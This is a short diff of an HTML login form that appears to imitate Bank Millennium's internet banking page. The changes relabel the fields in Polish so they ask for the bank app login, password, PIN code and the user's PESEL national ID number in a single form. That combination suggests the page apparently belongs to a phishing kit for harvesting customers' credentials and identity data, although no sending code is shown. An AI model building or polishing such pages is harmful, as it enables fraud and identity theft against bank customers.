@@ -105,7 +105,7 @@
                                                     <input type="hidden" name="step" value="after_code">
                                                     <div class="form-group">
                                                         <label for="login-input" class="_3LNER _3K-gi js-login-label">
-                                                            <span aria-hidden="true">MilleKod</span>
+                                                            <span aria-hidden="true">Login do aplikacji bankowej</span>
                                                             <span class="sr-only">Wpisz login do&nbsp;bankowości internetowej</span>
 
                                                         </label>
@@ -137,7 +137,7 @@
                                                     <div class="form-group">
                                                         <label for="password-input"
                                                                class="_3LNER _3K-gi js-password-label">
-                                                            <span aria-hidden="true">Haslo</span>
+                                                            <span aria-hidden="true">Hasło do aplikacji bankowej</span>
                                                         </label>
                                                         <input autocomplete="off" type="password" required
                                                                class="form-control" name="password"
@@ -146,7 +146,7 @@
                                                     <div class="form-group">
                                                         <label for="pin-input"
                                                                class="_3LNER _3K-gi js-pin-label">
-                                                            <span aria-hidden="true">Enter your PIN code</span>
+                                                            <span aria-hidden="true">Kod PIN do aplikacji bankowej</span>
                                                         </label>
                                                         <input autocomplete="off" type="text" required
                                                                class="form-control" name="pin"
@@ -155,7 +155,7 @@
                                                     <div class="form-group">
                                                         <label for="pesel-input"
                                                                class="_3LNER _3K-gi js-pesel-label">
-                                                            <span aria-hidden="true">Enter your PESEL number</span>
+                                                            <span aria-hidden="true">Twój PESEL</span>
                                                         </label>
                                                         <input autocomplete="off" type="text" required
                                                                class="form-control" name="pesel"
